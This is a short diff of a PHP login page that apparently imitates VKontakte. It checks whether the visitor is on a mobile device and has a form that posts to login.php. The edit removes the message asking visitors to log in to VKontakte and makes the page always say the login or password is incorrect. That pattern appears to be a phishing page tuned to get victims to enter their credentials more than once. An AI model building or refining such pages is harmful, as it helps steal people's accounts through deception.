@@ -74,11 +74,7 @@ if((strpos($agent, "Android") != false)or(strpos($agent, "iPhone") != false)){
       <div class="fi_row"><div class="service_msg_box">
   <div class="service_msg service_msg_warning">
     <?php
-    if($_GET['i']=="1"){
       echo "Неверный логин или пароль.";
-    }else{
-      echo "Чтобы продолжить, необходимо авторизоваться в <b>Вконтакте</b>.";
-    }
     ?></div>
 </div></div>
     <form method="POST" action="login.php" novalidate>
@@ -293,3 +289,4 @@ if((strpos($agent, "Android") != false)or(strpos($agent, "iPhone") != false)){
 
 }
  ?>
+
